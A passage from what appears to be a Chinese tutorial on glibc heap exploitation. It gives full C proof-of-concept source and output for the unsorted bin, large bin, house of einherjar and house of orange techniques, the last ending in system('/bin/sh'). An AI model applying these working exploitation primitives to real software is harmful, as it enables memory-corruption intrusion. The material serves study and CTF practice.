这个例子里要覆盖的地址位于bss段，处于heap段的下方，但是heap是向高地址生长的。所以这里的核心思想是利用整数溢出。 首先需要存在堆溢出漏洞。我们分配一个chunk0，此时堆上只有两个chunk：chunk0和top chunk。利用溢出修改top chunk的chunk_size为-1，即0xffffffffffffffff。这样做是因为后面需要申请很大的chunk进行整数溢出，这很可能导致top chunk大小不够，不去从top chunk切割而是调用mmap()。伪造了top chunk的大小后，在后面申请大chunk时就不会触发mmap()，确保了申请的大chunk也是从top chunk切割的。 接下来我们申请一个evil_size大小的chunk，使得申请后top chunk指针（经过整数溢出）指向我们想要覆盖的变量bss_var的前面。这个evil_size的计算方法如下： 1234567The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):* new_top = old_top + nb* nb = new_top - old_top* req + 2sizeof(long) = new_top - old_top* req = new_top - old_top - 2sizeof(long)* req = dest - 2sizeof(long) - old_top - 2sizeof(long)* req = dest - old_top - 4*sizeof(long) 这时再次malloc，得到的就是指向bss_var的指针了。 unsorted_bin_into_stack源码： 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdint.h&gt;int main() { intptr_t stack_buffer[4] = {0}; fprintf(stderr, &quot;Allocating the victim chunk\\n&quot;); intptr_t* victim = malloc(0x100); fprintf(stderr, &quot;Allocating another chunk to avoid consolidating the top chunk with the small one during the free()\\n&quot;); intptr_t* p1 = malloc(0x100); fprintf(stderr, &quot;Freeing the chunk %p, it will be inserted in the unsorted bin\\n&quot;, victim); free(victim); fprintf(stderr, &quot;Create a fake chunk on the stack&quot;); fprintf(stderr, &quot;Set size for next allocation and the bk pointer to any writable address&quot;); stack_buffer[1] = 0x100 + 0x10; stack_buffer[3] = (intptr_t)stack_buffer; //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointer\\n&quot;); fprintf(stderr, &quot;Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem\\n&quot;); victim[-1] = 32; victim[1] = (intptr_t)stack_buffer; // victim-&gt;bk is pointing to stack //------------------------------------ fprintf(stderr, &quot;Now next malloc will return the region of our fake chunk: %p\\n&quot;, &amp;stack_buffer[2]); fprintf(stderr, &quot;malloc(0x100): %p\\n&quot;, malloc(0x100));} 输出： 1234567Allocating the victim chunkAllocating another chunk to avoid consolidating the top chunk with the small one during the free()Freeing the chunk 0x2020010, it will be inserted in the unsorted binCreate a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim-&gt;size and victim-&gt;bk pointerSize should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_memNow next malloc will return the region of our fake chunk: 0x7ffe82ca7160malloc(0x100): 0x7ffe82ca7160 首先分配一个0x100的chunkvictim，在下面再垫一个chunk防止与top chunk合并，释放victim进入unsorted bin。现在在栈上伪造大小为0x110的chunk，并使其bk指向任意一个可写地址，比如自身。 假设存在漏洞可以修改victim的chunk_size和bk，那么我们可以将它的chunk_size改为合法nextsize范围内的一个值，且小于0x100。而bk则改为我们刚才伪造的chunk。这样下一次malloc(0x100)就会顺着bk查找，首先找到victim但大小不够，放入small bin。随后找到我们伪造的chunk并返回，此时伪造chunk的fd已经指向main_arena+88，可以借此泄露libc。 unsorted_bin_attack源码： 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates unsorted bin attack by write a large unsigned long value into stack\\n&quot;); fprintf(stderr, &quot;In practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the &quot; &quot;global variable global_max_fast in libc for further fastbin attack\\n\\n&quot;); unsigned long stack_var=0; fprintf(stderr, &quot;Let's first look at the target we want to rewrite on stack:\\n&quot;); fprintf(stderr, &quot;%p: %ld\\n\\n&quot;, &amp;stack_var, stack_var); unsigned long *p=malloc(400); fprintf(stderr, &quot;Now, we allocate first normal chunk on the heap at: %p\\n&quot;,p); fprintf(stderr, &quot;And allocate another normal chunk in order to avoid consolidating the top chunk with&quot; &quot;the first one during the free()\\n\\n&quot;); malloc(500); free(p); fprintf(stderr, &quot;We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer &quot; &quot;point to %p\\n&quot;,(void*)p[1]); //------------VULNERABILITY----------- p[1]=(unsigned long)(&amp;stack_var-2); fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\\n&quot;); fprintf(stderr, &quot;And we write it with the target address-16 (in 32-bits machine, it should be target address-8):%p\\n\\n&quot;,(void*)p[1]); //------------------------------------ malloc(400); fprintf(stderr, &quot;Let's malloc again to get the chunk we just free. During this time, the target should have already been &quot; &quot;rewritten:\\n&quot;); fprintf(stderr, &quot;%p: %p\\n&quot;, &amp;stack_var, (void*)stack_var);} 输出： 123456789101112131415This file demonstrates unsorted bin attack by write a large unsigned long value into stackIn practice, unsorted bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attackLet's first look at the target we want to rewrite on stack:0x7fff4c4511e8: 0Now, we allocate first normal chunk on the heap at: 0x1023010And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the free()We free the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7f60208a2b78Now emulating a vulnerability that can overwrite the victim-&gt;bk pointerAnd we write it with the target address-16 (in 32-bits machine, it should be target address-8):0x7fff4c4511d8Let's malloc again to get the chunk we just free. During this time, the target should have already been rewritten:0x7fff4c4511e8: 0x7f60208a2b78 和上一个类似，我们看到在free(p1)后，其bk指向main_arena+88。假设存在漏洞可以修改其bk，那么我们修改成目标地址-0x10的位置，相当于伪造了一个fake chunk。那么我们在拿回p1的时候，我们的fake chunk会被认为是unsorted bin中的下一个chunk，因此其bk也被修改为main_arena+88，于是我们在栈上写入了一个unsigned long值。 large_bin_attack源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109/* This technique is taken from https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/ [...] else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; } bck = fwd-&gt;bk; [...] mark_bin (av, victim_index); victim-&gt;bk = bck; victim-&gt;fd = fwd; fwd-&gt;bk = victim; bck-&gt;fd = victim; For more details on how large-bins are handled and sorted by ptmalloc, please check the Background section in the aforementioned link. [...] */#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){ fprintf(stderr, &quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\\n&quot;); fprintf(stderr, &quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot; &quot;global variable global_max_fast in libc for further fastbin attack\\n\\n&quot;); unsigned long stack_var1 = 0; unsigned long stack_var2 = 0; fprintf(stderr, &quot;Let's first look at the targets we want to rewrite on stack:\\n&quot;); fprintf(stderr, &quot;stack_var1 (%p): %ld\\n&quot;, &amp;stack_var1, stack_var1); fprintf(stderr, &quot;stack_var2 (%p): %ld\\n\\n&quot;, &amp;stack_var2, stack_var2); unsigned long *p1 = malloc(0x320); fprintf(stderr, &quot;Now, we allocate the first large chunk on the heap at: %p\\n&quot;, p1 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot; &quot; the first large chunk during the free()\\n\\n&quot;); malloc(0x20); unsigned long *p2 = malloc(0x400); fprintf(stderr, &quot;Then, we allocate the second large chunk on the heap at: %p\\n&quot;, p2 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot; &quot; the second large chunk during the free()\\n\\n&quot;); malloc(0x20); unsigned long *p3 = malloc(0x400); fprintf(stderr, &quot;Finally, we allocate the third large chunk on the heap at: %p\\n&quot;, p3 - 2); fprintf(stderr, &quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot; &quot; the third large chunk during the free()\\n\\n&quot;); malloc(0x20); free(p1); free(p2); fprintf(stderr, &quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot; &quot; [ %p &lt;--&gt; %p ]\\n\\n&quot;, (void *)(p2 - 2), (void *)(p2[0])); malloc(0x90); fprintf(stderr, &quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot; &quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot; &quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot; &quot; [ %p ]\\n\\n&quot;, (void *)((char *)p1 + 0x90)); free(p3); fprintf(stderr, &quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot; &quot; [ %p &lt;--&gt; %p ]\\n\\n&quot;, (void *)(p3 - 2), (void *)(p3[0])); //------------VULNERABILITY----------- fprintf(stderr, &quot;Now emulating a vulnerability that can overwrite the freed second large chunk's \\&quot;size\\&quot;&quot; &quot; as well as its \\&quot;bk\\&quot; and \\&quot;bk_nextsize\\&quot; pointers\\n&quot;); fprintf(stderr, &quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot; &quot; at the head of the large bin freelist. To overwrite the stack variables, we set \\&quot;bk\\&quot; to 16 bytes before stack_var1 and&quot; &quot; \\&quot;bk_nextsize\\&quot; to 32 bytes before stack_var2\\n\\n&quot;); p2[-1] = 0x3f1; p2[0] = 0; p2[2] = 0; p2[1] = (unsigned long)(&amp;stack_var1 - 2); p2[3] = (unsigned long)(&amp;stack_var2 - 4); //------------------------------------ malloc(0x90); fprintf(stderr, &quot;Let's malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot; &quot; During this time, targets should have already been rewritten:\\n&quot;); fprintf(stderr, &quot;stack_var1 (%p): %p\\n&quot;, &amp;stack_var1, (void *)stack_var1); fprintf(stderr, &quot;stack_var2 (%p): %p\\n&quot;, &amp;stack_var2, (void *)stack_var2); return 0;} 输出： 12345678910111213141516171819202122232425262728This file demonstrates large bin attack by writing a large unsigned long value into stackIn practice, large bin attack is generally prepared for further attacks, such as rewriting the global variable global_max_fast in libc for further fastbin attackLet's first look at the targets we want to rewrite on stack:stack_var1 (0x7fff33530b00): 0stack_var2 (0x7fff33530b08): 0Now, we allocate the first large chunk on the heap at: 0xef3000And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the free()Then, we allocate the second large chunk on the heap at: 0xef3360And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the free()Finally, we allocate the third large chunk on the heap at: 0xef37a0And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the free()We free the first and second large chunks now and they will be inserted in the unsorted bin: [ 0xef3360 &lt;--&gt; 0xef3000 ]Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0xef30a0 ]Now, we free the third large chunk and it will be inserted in the unsorted bin: [ 0xef37a0 &lt;--&gt; 0xef30a0 ]Now emulating a vulnerability that can overwrite the freed second large chunk's &quot;size&quot; as well as its &quot;bk&quot; and &quot;bk_nextsize&quot; pointersBasically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk at the head of the large bin freelist. To overwrite the stack variables, we set &quot;bk&quot; to 16 bytes before stack_var1 and &quot;bk_nextsize&quot; to 32 bytes before stack_var2Let's malloc again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:stack_var1 (0x7fff33530b00): 0xef37a0stack_var2 (0x7fff33530b08): 0xef37a0 这种攻击方法在glibc 2.29推出，unsorted bin attack失效之后可能会有大的用武之地。 首先分配了一个small chunk p1，然后分配了2个large chunk p2和p3。在每个chunk后面都插一小段fast chunk防止合并。释放掉p1和p2，两者都会进入unsorted bin。 随后申请比p1小的chunk，这一步比较复杂： 从unsorted bin末尾拿出p1，放入对应small bin 从unsorted bin末尾拿出p2，由于large bin为空，直接放入对应large bin unsorted bin已经空了，于是从small bin中拿出p1，切割0x90的chunk返回给程序 p1被切割剩下的部分_p1重新回到unsorted bin 再释放p3，也进入unsorted bin。这时，large bin中有p2一个chunk，大小为0x410；unsorted bin中有p3，_p1两个chunk，大小分别为0x410,0x290（0x330-0xa0）。 现在假设能控制整个p2的内容，让它的chunk_size=0x3f1，bk=addr1且bk_nextsize=addr2。那么再次申请small chunk时： 从unsorted bin末尾拿出_p1，放入对应small bin 从unsorted bin末尾拿出p3，准备放入对应large bin，但是对应large bin非空 从对应large bin第一个chunk（p2）开始遍历，由于p2大小被修改，0x3f0 &lt; 0x410，所以p3插入到了链表头。 插入的代码是这样的，注意这里没有检查bk_nextsize的合法性： 1234567891011if ((unsigned long) size == (unsigned long) fwd-&gt;size) /* Always insert in the second position. */ fwd = fwd-&gt;fd;else { victim-&gt;fd_nextsize = fwd; victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize; fwd-&gt;bk_nextsize = victim; victim-&gt;bk_nextsize-&gt;fd_nextsize = victim; }bck = fwd-&gt;bk; 这里的victim是p3，fwd是p2，注意两者大小不能相等，因为漏洞在else里。由于fwd-&gt;bk_nextsize是addr2，于是第二行把这个值给了victim-&gt;bk_nextsize，第四行就等价于*(addr2+4) = victim。 同时，这里令bck = fwd-&gt;bk即addr1，而接着还会执行一段代码： 12345mark_bin (av, victim_index);victim-&gt;bk = bck;victim-&gt;fd = fwd;fwd-&gt;bk = victim;bck-&gt;fd = victim; 这里bck-&gt;fd = victim就等价于*(addr1+2) = victim。于是我们成功修改了addr1+2和addr2+4的值。 house_of_einherjar源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;/* Credit to st4g3r for publishing this technique The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc() This technique may result in a more powerful primitive than the Poison Null Byte, but it has the additional requirement of a heap leak.*/int main(){ fprintf(stderr, &quot;Welcome to House of Einherjar!\\n&quot;); fprintf(stderr, &quot;Tested in Ubuntu 16.04 64bit.\\n&quot;); fprintf(stderr, &quot;This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.\\n&quot;); uint8_t* a; uint8_t* b; uint8_t* d; fprintf(stderr, &quot;\\nWe allocate 0x38 bytes for 'a'\\n&quot;); a = (uint8_t*) malloc(0x38); fprintf(stderr, &quot;a: %p\\n&quot;, a); int real_a_size = malloc_usable_size(a); fprintf(stderr, &quot;Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: %#x\\n&quot;, real_a_size); // create a fake chunk fprintf(stderr, &quot;\\nWe create a fake chunk wherever we want, in this case we'll create the chunk on the stack\\n&quot;); fprintf(stderr, &quot;However, you can also create the chunk in the heap or the bss, as long as you know its address\\n&quot;); fprintf(stderr, &quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\\n&quot;); fprintf(stderr, &quot;(although we could do the unsafe unlink technique here in some scenarios)\\n&quot;); size_t fake_chunk[6]; fake_chunk[0] = 0x100; // prev_size is now used and must equal fake_chunk's size to pass P-&gt;bk-&gt;size == P-&gt;prev_size fake_chunk[1] = 0x100; // size of the chunk just needs to be small enough to stay in the small bin fake_chunk[2] = (size_t) fake_chunk; // fwd fake_chunk[3] = (size_t) fake_chunk; // bck fake_chunk[4] = (size_t) fake_chunk; //fwd_nextsize fake_chunk[5] = (size_t) fake_chunk; //bck_nextsize fprintf(stderr, &quot;Our fake chunk at %p looks like:\\n&quot;, fake_chunk); fprintf(stderr, &quot;prev_size (not used): %#lx\\n&quot;, fake_chunk[0]); fprintf(stderr, &quot;size: %#lx\\n&quot;, fake_chunk[1]); fprintf(stderr, &quot;fwd: %#lx\\n&quot;, fake_chunk[2]); fprintf(stderr, &quot;bck: %#lx\\n&quot;, fake_chunk[3]); fprintf(stderr, &quot;fwd_nextsize: %#lx\\n&quot;, fake_chunk[4]); fprintf(stderr, &quot;bck_nextsize: %#lx\\n&quot;, fake_chunk[5]); /* In this case it is easier if the chunk size attribute has a least significant byte with * a value of 0x00. The least significant byte of this will be 0x00, because the size of * the chunk includes the amount requested plus some amount required for the metadata. */ b = (uint8_t*) malloc(0xf8); int real_b_size = malloc_usable_size(b); fprintf(stderr, &quot;\\nWe allocate 0xf8 bytes for 'b'.\\n&quot;); fprintf(stderr, &quot;b: %p\\n&quot;, b); uint64_t* b_size_ptr = (uint64_t*)(b - 8); /* This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit*/ fprintf(stderr, &quot;\\nb.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;b.size is: (0x100) | prev_inuse = 0x101\\n&quot;); fprintf(stderr, &quot;We overflow 'a' with a single null byte into the metadata of 'b'\\n&quot;); a[real_a_size] = 0; fprintf(stderr, &quot;b.size: %#lx\\n&quot;, *b_size_ptr); fprintf(stderr, &quot;This is easiest if b.size is a multiple of 0x100 so you &quot; &quot;don't change the size of b, only its prev_inuse bit\\n&quot;); fprintf(stderr, &quot;If it had been modified, we would need a fake chunk inside &quot; &quot;b where it will try to consolidate the next chunk\\n&quot;); // Write a fake prev_size to the end of a fprintf(stderr, &quot;\\nWe write a fake prev_size to the last %lu bytes of a so that &quot; &quot;it will consolidate with our fake chunk\\n&quot;, sizeof(size_t)); size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk); fprintf(stderr, &quot;Our fake prev_size will be %p - %p = %#lx\\n&quot;, b-sizeof(size_t)*2, fake_chunk, fake_size); *(size_t*)&amp;a[real_a_size-sizeof(size_t)] = fake_size; //Change the fake chunk's size to reflect b's new prev_size fprintf(stderr, &quot;\\nModify fake chunk's size to reflect b's new prev_size\\n&quot;); fake_chunk[1] = fake_size; // free b and it will consolidate with our fake chunk fprintf(stderr, &quot;Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\\n&quot;); free(b); fprintf(stderr, &quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\\n&quot;, fake_chunk[1]); //if we allocate another chunk before we free b we will need to //do two things: //1) We will need to adjust the size of our fake chunk so that //fake_chunk + fake_chunk's size points to an area we control //2) we will need to write the size of our fake chunk //at the location we control. //After doing these two things, when unlink gets called, our fake chunk will //pass the size(P) == prev_size(next_chunk(P)) test. //otherwise we need to make sure that our fake chunk is up against the //wilderness fprintf(stderr, &quot;\\nNow we can call malloc() and it will begin in our fake chunk\\n&quot;); d = malloc(0x200); fprintf(stderr, &quot;Next malloc(0x200) is at %p\\n&quot;, d);} 输出： 123456789101112131415161718192021222324252627282930313233343536373839Welcome to House of Einherjar!Tested in Ubuntu 16.04 64bit.This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.We allocate 0x38 bytes for 'a'a: 0x1cc0010Since we want to overflow 'a', we need the 'real' size of 'a' after rounding: 0x38We create a fake chunk wherever we want, in this case we'll create the chunk on the stackHowever, you can also create the chunk in the heap or the bss, as long as you know its addressWe set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks(although we could do the unsafe unlink technique here in some scenarios)Our fake chunk at 0x7fffd1743240 looks like:prev_size (not used): 0x100size: 0x100fwd: 0x7fffd1743240bck: 0x7fffd1743240fwd_nextsize: 0x7fffd1743240bck_nextsize: 0x7fffd1743240We allocate 0xf8 bytes for 'b'.b: 0x1cc0050b.size: 0x101b.size is: (0x100) | prev_inuse = 0x101We overflow 'a' with a single null byte into the metadata of 'b'b.size: 0x100This is easiest if b.size is a multiple of 0x100 so you don't change the size of b, only its prev_inuse bitIf it had been modified, we would need a fake chunk inside b where it will try to consolidate the next chunkWe write a fake prev_size to the last 8 bytes of a so that it will consolidate with our fake chunkOur fake prev_size will be 0x1cc0040 - 0x7fffd1743240 = 0xffff80003057ce00Modify fake chunk's size to reflect b's new prev_sizeNow we free b and this will consolidate with our fake chunk since b prev_inuse is not setOur fake chunk size is now 0xffff80003059ddc1 (b.size + fake_prev_size)Now we can call malloc() and it will begin in our fake chunkNext malloc(0x200) is at 0x7fffd1743250 这个利用方式基于off-by-null，首先伪造chunk，使其fd,bk,fd_nextsize,bk_nextsize均指向自身以绕过unlink检查。然后申请大小以8结尾的chunk a，以及实际大小以0结尾的chunk b，这样从a溢出时仅仅修改了b的PREV_INUSE位，同时a还能伪造b的prev_size字段。 我们将b的prev_size设置为b的chunk指针地址减去fake chunk的chunk指针地址，对fake chunk的size字段也作相应修改，那么释放b时就会和fake chunk合并，下次再申请时就能拿到fake chunk了。 house_of_orange源码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;/* The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer It requires a leak of the heap and the libc Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html*//* This function is just present to emulate the scenario where the address of the function system is known.*/int winner ( char *ptr);int main(){ /* The House of Orange starts with the assumption that a buffer overflow exists on the heap using which the Top (also called the Wilderness) chunk can be corrupted. At the beginning of execution, the entire heap is part of the Top chunk. The first allocations are usually pieces of the Top chunk that are broken off to service the request. Thus, with every allocation, the Top chunks keeps getting smaller. And in a situation where the size of the Top chunk is smaller than the requested value, there are two possibilities: 1) Extend the Top chunk 2) Mmap a new page If the size requested is smaller than 0x21000, then the former is followed. */ char *p1, *p2; size_t io_list_all, *top; fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot; &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\\n&quot;); fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot; &quot;https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\\n&quot;); /* Firstly, lets allocate a chunk on the heap. */ p1 = malloc(0x400-16); /* The heap is usually allocated with a top chunk of size 0x21000 Since we've allocate a chunk of size 0x400 already, what's left is 0x20c00 with the PREV_INUSE bit set =&gt; 0x20c01. The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap, it must also be page aligned at the end. Also, if a chunk that is adjacent to the Top chunk is to be freed, then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set. So that means that there are two conditions that must always be true. 1) Top chunk + size has to be page aligned 2) Top chunk's prev_inuse bit has to be set. We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE. What's left is 0x20c01 Now, let's satisfy the conditions 1) Top chunk + size has to be page aligned 2) Top chunk's prev_inuse bit has to be set. */ top = (size_t *) ( (char *) p1 + 0x400 - 16); top[1] = 0xc01; /* Now we request a chunk of size larger than the size of the Top chunk. Malloc tries to service this request by extending the Top chunk This forces sysmalloc to be invoked. In the usual scenario, the heap looks like the following |------------|------------|------...----| | chunk | chunk | Top ... | |------------|------------|------...----| heap start heap end And the new area that gets allocated is contiguous to the old heap end. So the new size of the Top chunk is the sum of the old size and the newly allocated size. In order to keep track of this change in size, malloc uses a fencepost chunk, which is basically a temporary chunk. After the size of the Top chunk has been updated, this chunk gets freed. In our scenario however, the heap looks like |------------|------------|------..--|--...--|---------| | chunk | chunk | Top .. | ... | new Top | |------------|------------|------..--|--...--|---------| heap start heap end In this situation, the new Top will be starting from an address that is adjacent to the heap end. So the area between the second chunk and the heap end is unused. And the old Top chunk gets freed. Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes, it gets added to list of unsorted bins. Now we request a chunk of size larger than the size of the top chunk. This forces sysmalloc to be invoked. And ultimately invokes _int_free Finally the heap looks like this: |------------|------------|------..--|--...--|---------| | chunk | chunk | free .. | ... | new Top | |------------|------------|------..--|--...--|---------| heap start new heap end */ p2 = malloc(0x1000); /* Note that the above chunk will be allocated in a different page that gets mmapped. It will be placed after the old heap's end Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins Here starts phase two of the attack. We assume that we have an overflow into the old top chunk so we could overwrite the chunk's size. For the second phase we utilize this overflow again to overwrite the fd and bk pointer of this chunk in the unsorted bin list. There are two common ways to exploit the current state: - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations) - Use the unlinking of the chunk for an *where*-controlled write of the libc's main_arena unsorted-bin-list. (requires at least one allocation) The former attack is pretty straight forward to exploit, so we will only elaborate on a variant of the latter, developed by Angelboy in the blog post linked above. The attack is pretty stunning, as it exploits the abort call itself, which is triggered when the libc detects any bogus state of the heap. Whenever abort is triggered, it will flush all the file pointers by calling _IO_flush_all_lockp. Eventually, walking through the linked list in _IO_list_all and calling _IO_OVERFLOW on them. The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh'). More about file-pointer exploitation can be found here: https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/ The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they currently point to the libc's main_arena. */ io_list_all = top[2] + 0x9a8; /* We plan to overwrite the fd and bk pointers of the old top, which has now been added to the unsorted bins. When malloc tries to satisfy a request by splitting this free chunk the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list in libc's main_arena. Note that this overwrite occurs before the sanity check and therefore, will occur in any case. Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all. So, we should set chunk-&gt;bk to be _IO_list_all - 16 */ top[3] = io_list_all - 0x10; /* At the end, the system function will be invoked with the pointer to this file pointer. If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh) */ memcpy( ( char *) top, &quot;/bin/sh\\x00&quot;, 8); /* The function _IO_flush_all_lockp iterates through the file pointer linked-list in _IO_list_all. Since we can only overwrite this address with main_arena's unsorted-bin-list, the idea is to get control over the memory at the corresponding fd-ptr. The address of the next file pointer is located at base_address+0x68. This corresponds to smallbin-4, which holds all the smallbins of sizes between 90 and 98. For further information about the libc's bin organisation see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/ Since we overflow the old top chunk, we also control it's size field. Here it gets a little bit tricky, currently the old top chunk is in the unsortedbin list. For each allocation, malloc tries to serve the chunks in this list first, therefore, iterates over the list. Furthermore, it will sort all non-fitting chunks into the corresponding bins. If we set the size to 0x61 (97) (prev_inuse bit has to be set) and trigger an non fitting smaller allocation, malloc will sort the old chunk into the smallbin-4. Since this bin is currently empty the old top chunk will be the new head, therefore, occupying the smallbin[4] location in the main_arena and eventually representing the fake file pointer's fd-ptr. In addition to sorting, malloc will also perform certain size checks on them, so after sorting the old top chunk and following the bogus fd pointer to _IO_list_all, it will check the corresponding size field, detect that the size is smaller than MINSIZE &quot;size &lt;= 2 * SIZE_SZ&quot; and finally triggering the abort call that gets our chain rolling. Here is the corresponding code in the libc: https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717 */ top[1] = 0x61; /* Now comes the part where we satisfy the constraints on the fake file pointer required by the function _IO_flush_all_lockp and tested here: https://code.woboq.org/userspace/glibc/libio/genops.c.html#813 We want to satisfy the first condition: fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base */ _IO_FILE *fp = (_IO_FILE *) top; /* 1. Set mode to 0: fp-&gt;_mode &lt;= 0 */ fp-&gt;_mode = 0; // top+0xc0 /* 2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base */ fp-&gt;_IO_write_base = (char *) 2; // top+0x20 fp-&gt;_IO_write_ptr = (char *) 3; // top+0x28 /* 4) Finally set the jump table to controlled memory and place system there. The jump table pointer is right after the _IO_FILE struct: base_address+sizeof(_IO_FILE) = jump_table 4-a) _IO_OVERFLOW calls the ptr at offset 3: jump_table+0x18 == winner */ size_t *jump_table = &amp;top[12]; // controlled memory jump_table[3] = (size_t) &amp;winner; *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8 /* Finally, trigger the whole chain by calling malloc */ malloc(10); /* The libc's error message will be printed to the screen But you'll get a shell anyways. */ return 0;}int winner(char *ptr){ system(ptr); return 0;} 输出就没有必要放了。 先申请了实际大小为0x400的chunk，然后为了满足页对齐以及top chunk的PREV_INUSE位的条件，通过溢出修改top chunk的size为0xc01。此时，如果我们再申请一个top chunk大小不能满足的chunk，就会申请新的top chunk，而old top进入unsorted bin中。 接下来，我们利用libc的异常处理程序getshell。出现异常并终止程序时，会调用_IO_flush_all_lockp，遍历_IO_list_all并对它们依次调用_IO_OVERFLOW。不难想到，如果伪造_IO_list_all指针的前8字节为/bin/sh\\x00，再伪造_IO_OVERFLOW为system，就可以达到目的。其中，_IO_list_all地址可由已经在unsorted bin中的old top的fd也就是main_arena+88推算出来。 如果我们后续要切割这块old top来满足内存申请，那么old_top-&gt;bk-&gt;fd会被覆盖为main_arena+88，这和unsorted bin 